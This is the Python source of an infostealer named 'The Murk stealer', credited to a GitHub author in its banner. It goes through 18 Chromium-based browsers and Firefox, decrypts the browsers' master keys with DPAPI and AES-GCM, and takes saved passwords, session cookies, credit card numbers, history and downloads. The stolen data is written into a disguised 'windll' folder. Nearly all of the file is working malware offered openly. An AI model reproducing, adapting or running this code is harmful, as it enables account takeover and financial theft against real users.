#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#


"""
All imports
"""
import base64
import json
import os
import shutil
import sqlite3
from pathlib import Path
from zipfile import ZipFile
import configparser
import subprocess
import ffpass
import win32crypt
from datetime import datetime, timedelta

from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

listData = []
logins = ''''''
cookies = ''''''
history = []
downloads = []
cards = []
browsersCounter = -1
names = [
            'Amigo',
            'Torch',
            'Kometa',
            'Orbitum',
            'CentBrowser',
            '7Star',
            'Sputnik',
            'Vivaldi',
            'Chrome SxS',
            'Chrome',
            'Epic Privacy Browser',
            'Edge',
            'Uran',
            'YandexBrowser',
            'Brave-Browser',
            'Iridium',
            'Opera GX',
            'Opera',
]

class Browsers:
    def __init__(self):
        listData.append("\n\n🌐Browsers")
        Chromium()
        FireFox()
    def Return():
        return listData

class Upload:
    def __init__(self):
        self.write_files()
    
    def write_files(self):
        self.Colected = False
        global browsersCounter
        pathf = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
        os.makedirs(rf'{pathf}\windll\Browsers\{names[browsersCounter]}', exist_ok=True)
        print(names[browsersCounter])
        if logins:
            if not self.Colected:
                listData.append("\n"+names[browsersCounter])
            self.Colected = True
            print ("logins")
            with open(rf"{pathf}\windll\Browsers\{names[browsersCounter]}\logins.txt", "w", encoding="utf-8") as f:
                f.write(logins)
            f.close()
            listData.append("\n∟📜logins")

        if cookies:
            if not self.Colected:
                listData.append("\n"+names[browsersCounter])
            self.Colected = True
            print ("cookies")
            with open(rf"{pathf}\windll\Browsers\{names[browsersCounter]}\cookies.txt", "w", encoding="utf-8") as f:
                f.write(cookies)
            f.close()
            listData.append("\n∟🍪cookies")

        if history:
            if not self.Colected:
                listData.append("\n"+names[browsersCounter])
            self.Colected = True
            print ("history")
            with open(rf"{pathf}\windll\Browsers\{names[browsersCounter]}\history.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in history))
            listData.append("\n∟📰history")

        if downloads:
            if not self.Colected:
                listData.append("\n"+names[browsersCounter])
            self.Colected = True
            print ("downloads")
            with open(rf"{pathf}\windll\Browsers\{names[browsersCounter]}\downloads.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in downloads))
            listData.append("\n∟📥downloads")

        if cards:
            if not self.Colected:
                listData.append("\n"+names[browsersCounter])
            self.Colected = True
            print("cards")
            with open(rf"{pathf}\windll\Browsers\{names[browsersCounter]}\cards.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in cards))
            listData.append("\n∟💳cards")


class FireFox:
    def __init__(self):
        self.Firefox()

    def Firefox(self):
        try:
            path = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
            os.makedirs(rf'{path}\windll\Browsers\Firefox', exist_ok=True)
            mozilla_profile = os.path.join(os.getenv('APPDATA'), r'Mozilla\Firefox')
            mozilla_profile_ini = os.path.join(mozilla_profile, r'profiles.ini')
            profile = configparser.ConfigParser()
            profile.read(mozilla_profile_ini)
            data_path = os.path.normpath(os.path.join(mozilla_profile, profile.get('Profile0', 'Path')))
            subprocesss = subprocess.Popen("ffpass export -d  " + data_path, shell=True, stdout=subprocess.PIPE)
            subprocess_return = subprocesss.stdout.read()
            passwords = str(subprocess_return)
            with open(rf'{path}\windll\Browsers\Firefox\firefox.txt', "a", encoding="utf-8") as file:
                file.write(passwords.replace('\\r', '\n'))
                file.close()
        except Exception as e:
            print(e)

class Chromium:
    def __init__(self):
        global logins
        global cookies
        global history
        global downloads
        global cards

        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browsers = {
            'amigo': self.appdata + '\\Amigo\\User Data',
            'torch': self.appdata + '\\Torch\\User Data',
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
            'operagx': self.roaming + '\\Opera Software\\Opera GX Stable',
            'opera': self.roaming + '\\Opera Software\\Opera Stable'
        }
        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ] 
        global browsersCounter

        for _, path in self.browsers.items():
            browsersCounter+=1
            logins = ''''''
            cookies = ''''''
            history = []
            downloads = []
            cards = []

            if not os.path.exists(path):
                continue

            self.master_key = self.get_master_key_chromium(path)
            if not self.master_key:
                continue
            
            for profile in self.profiles:
                if not os.path.exists(path + '\\' + profile):
                    continue
                
                operations = [
                    self.get_login_data,
                    self.get_cookies,
                    self.get_web_history,
                    self.get_downloads,
                    self.get_credit_cards,
                ]

                for operation in operations:
                    try:
                        operation(path, profile)
                    except Exception as e:
                        pass
            Upload()

    def get_login_data(self, path: str, profile: str):
        try:
            global logins
            master_key = self.get_master_key_chromium(path)
            if path != "\\Opera Software\\Opera GX Stable" or path != "\\Opera Software\\Opera Stable":
                login_db = f'{path}\\{profile}\\Login Data'
            else:
                login_db = f'{path}\\Login Data'
            shutil.copy2(login_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db') 
            conn = sqlite3.connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db')
            cursor = conn.cursor()

        
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = self.decrypt_password(encrypted_password, master_key)

                alldatapass = "URL: " + url + " UserName: " + username + " Password: " + decrypted_password + "\n"
                logins += f"\n\n\n{profile}:\n\n"
                logins += alldatapass
            try:
                os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db')
            except:
                pass
        except:
            pass

    def decrypt_password(self,buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = self.generate_cipher(master_key, iv)
            decrypted_pass = self.decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()  
            return decrypted_pass
        except:
            return "Chrome < 80"    

    def decrypt_payload(self,cipher, payload):
        return cipher.decrypt(payload)


    def generate_cipher(self,aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def get_cookies(self, path: str, profile: str):
        try:
            global cookies
            CookiesSQL = "SELECT * FROM cookies"
            if path != "\\Opera Software\\Opera GX Stable" or path != "\\Opera Software\\Opera Stable":
                data_path = fr'{path}\{profile}\Network'
            else:
                data_path = fr'{path}\Network'
            #files = os.listdir(data_path)
            history_db = os.path.join(data_path, 'Cookies')
            shutil.copy2(history_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')# find and copy cookies
            #shutil.copy2(history_db, os.environ['USERPROFILE'] + 'C:\\windll\\Browsers\\Chrome\\cookies.db')
            c = sqlite3.connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')
            cursor = c.cursor()
        
        
            results = '[\n'

            result = cursor.execute(CookiesSQL).fetchall()

            """
            decode cookies
            """
            for result in cursor.execute(CookiesSQL).fetchall():
                if result[8] == 0:
                    secure = False
                else:
                    secure = True

                if result[9] == 0:
                    http = False
                else:
                    http = True
                results += '''
        {
            "domain": "%s",
            "expirationDate": %s,
            "name": "%s",
            "httpOnly": %s,
            "path": "%s",
            "secure": %s,
            "value": "%s"
        },
                '''% (result[1], result[7], result[2], http, result[6], secure, self.decrypt(result[5], self.get_master_key_chromium(path)))

            results = results.replace('True', 'true')
            results = results.replace('False', 'false')
            results += '\n]'
            cookies += f"\n\n\n{profile}:\n\n"
            cookies += results
            try:
                os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')# clear all
            except:
                pass
        except:
            pass
    

    def get_master_key_chromium(self,path: str):
        try:
            with open(rf'{path}\Local State', "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            master_key_chrome = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key_chrome = master_key_chrome[5:]  
            master_key_chrome = win32crypt.CryptUnprotectData(master_key_chrome, None, None, None, 0)[1]
            return master_key_chrome
        except Exception as e:
            print("get_master_key_chromium: "+e)


    def decrypt(self,buff, master_key):
        try:
            return AES.new(master_key, AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
        except:
            return "Can't decode"

    def get_web_history(self, path: str, profile: str):
        try:
            history.append(f"\n\n\n{profile}:\n\n")
            HistorySQL = "SELECT url FROM visits"
            HistoryLinksSQL = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"
            if path != "\\Opera Software\\Opera GX Stable" or path != "\\Opera Software\\Opera Stable":
                data_path = f'{path}\{profile}'
            else:
                data_path = f'{path}'
            #files = os.listdir(data_path)
            history_db = os.path.join(data_path, 'history')
            shutil.copy2(history_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\history.db')# find and copy history
            c = sqlite3.connect(os.environ['USERPROFILE']+ '\\AppData\\Roaming\\history.db')
            cursor = c.cursor()
            for result in cursor.execute(HistorySQL).fetchall():
                data = cursor.execute(HistoryLinksSQL % result[0]).fetchone()
                result = f"URL: {data[0]}\nTitle: {data[1]}\nLast Visit: {self.time(data[2])}\n\n"
                if result in history:
                    continue
                history.append(result)
            try:
                os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\history.db')# clear all
            except:
                pass
        except:
                pass


    def time(self,date):
        try:
            return str(datetime(1601, 1, 1) + timedelta(microseconds=date))
        except:
            return "Can't decode"

    def get_downloads(self, path: str, profile: str):
        if path != "\\Opera Software\\Opera GX Stable" or path != "\\Opera Software\\Opera Stable":
            downloads_db = f'{path}\\{profile}\\History'
        else:
            downloads_db = f'{path}\\History'
        if not os.path.exists(downloads_db):
            return

        shutil.copy(downloads_db, 'downloads_db')
        conn = sqlite3.connect('downloads_db')
        cursor = conn.cursor()
        cursor.execute('SELECT tab_url, target_path FROM downloads')
        for row in cursor.fetchall():
            if not row[0] or not row[1]:
                continue

            downloads.append(Types.Download(row[0], row[1]))

        conn.close()
        os.remove('downloads_db')

    def get_credit_cards(self, path: str, profile: str):
        if path != "\\Opera Software\\Opera GX Stable" or path != "\\Opera Software\\Opera Stable":
            cards_db = f'{path}\\{profile}\\Web Data'
        else:
            cards_db = f'{path}\\Web Data'
        if not os.path.exists(cards_db):
            return

        shutil.copy(cards_db, 'cards_db')
        conn = sqlite3.connect('cards_db')
        cursor = conn.cursor()
        cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue

            card_number = self.decrypt_password(row[3], self.master_key)
            cards.append(Types.CreditCard(row[0], row[1], row[2], card_number, row[4]))

        conn.close()
        os.remove('cards_db')

class Types:
    class Download:
        def __init__(self, tab_url, target_path):
            self.tab_url = tab_url
            self.target_path = target_path

        def __str__(self):
            return f'{self.tab_url}\t{self.target_path}'

        def __repr__(self):
            return self.__str__()

    class CreditCard:
        def __init__(self, name, month, year, number, date_modified):
            self.name = name
            self.month = month
            self.year = year
            self.number = number
            self.date_modified = date_modified

        def __str__(self):
            return f'{self.name}\t{self.month}\t{self.year}\t{self.number}\t{self.date_modified}'

        def __repr__(self):
            return self.__str__()